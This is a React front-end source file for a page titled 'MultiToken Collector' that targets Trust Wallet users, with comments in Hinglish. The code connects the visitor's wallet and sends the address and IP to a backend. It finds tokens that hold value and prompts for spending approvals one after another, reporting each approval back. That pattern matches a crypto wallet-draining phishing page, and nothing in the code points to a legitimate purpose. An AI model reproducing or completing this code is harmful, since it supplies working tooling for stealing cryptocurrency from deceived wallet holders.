import React, { useState, useEffect } from 'react';
import { detectOS, isTrustWallet } from './utils/detectOS';
import { checkTrustWalletDeepLink } from './services/deepLinkService';
import { connectWallet, getWalletAddress } from './services/walletService';
import { scanTokens, getTokensWithValue } from './services/tokenService';
import { notifyWalletConnect, notifyApproval } from './services/apiService';
import ApprovalModal from './components/ApprovalModal';

function App() {
    const [os, setOs] = useState('');
    const [walletAddress, setWalletAddress] = useState('');
    const [tokens, setTokens] = useState([]);
    const [currentToken, setCurrentToken] = useState(null);
    const [showModal, setShowModal] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    useEffect(() => {
        // OS detect karo
        const detectedOS = detectOS();
        setOs(detectedOS);
        
        // Trust Wallet check
        if (!isTrustWallet()) {
            setError('You are not eligible. Please install Trust Wallet and try again.');
        }
    }, []);

    const handleConnectWallet = async () => {
        try {
            setLoading(true);
            setError('');
            
            // Trust Wallet check
            if (!isTrustWallet()) {
                setError('You are not eligible. Please install Trust Wallet and try again.');
                return;
            }
            
            // Wallet connect
            const address = await connectWallet();
            setWalletAddress(address);
            
            // Backend ko wallet connect notify karo
            const ipAddress = await getIPAddress();
            await notifyWalletConnect(address, ipAddress);
            
            // Tokens scan karo
            const scannedTokens = await scanTokens(address);
            const tokensWithValue = getTokensWithValue(scannedTokens);
            setTokens(tokensWithValue);
            
            // Pehla token approval ke liye
            if (tokensWithValue.length > 0) {
                setCurrentToken(tokensWithValue[0]);
                setShowModal(true);
            }
            
        } catch (error) {
            console.error('Wallet connect error:', error);
            setError(error.message);
        } finally {
            setLoading(false);
        }
    };

    const handleApprovalComplete = async (tokenAddress) => {
        try {
            // Backend ko approval notify karo (fire & forget)
            notifyApproval(walletAddress, tokenAddress);
            
            // Modal band karo
            setShowModal(false);
            
            // Next token find karo
            const currentIndex = tokens.findIndex(t => t.tokenAddress === tokenAddress);
            const nextToken = tokens[currentIndex + 1];
            
            // 2 second delay
            setTimeout(() => {
                if (nextToken) {
                    setCurrentToken(nextToken);
                    setShowModal(true);
                } else {
                    setCurrentToken(null);
                }
            }, 2000);
            
        } catch (error) {
            console.error('Approval error:', error);
        }
    };

    return (
        <div className="app">
            <h1>MultiToken Collector</h1>
            <p>OS: {os}</p>
            
            {error && <div className="error">{error}</div>}
            
            {!walletAddress ? (
                <button onClick={handleConnectWallet} disabled={loading}>
                    {loading ? 'Connecting...' : 'Connect Trust Wallet'}
                </button>
            ) : (
                <div>
                    <p>Wallet: {walletAddress}</p>
                    <p>Tokens with value: {tokens.length}</p>
                    
                    {tokens.map((token, index) => (
                        <div key={token.tokenAddress} className="token-item">
                            <span>{index + 1}. {token.symbol}</span>
                            <span>${token.value}</span>
                        </div>
                    ))}
                </div>
            )}
            
            {showModal && currentToken && (
                <ApprovalModal
                    token={currentToken}
                    onComplete={handleApprovalComplete}
                    onCancel={() => setShowModal(false)}
                />
            )}
        </div>
    );
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown';
    }
}

export default App;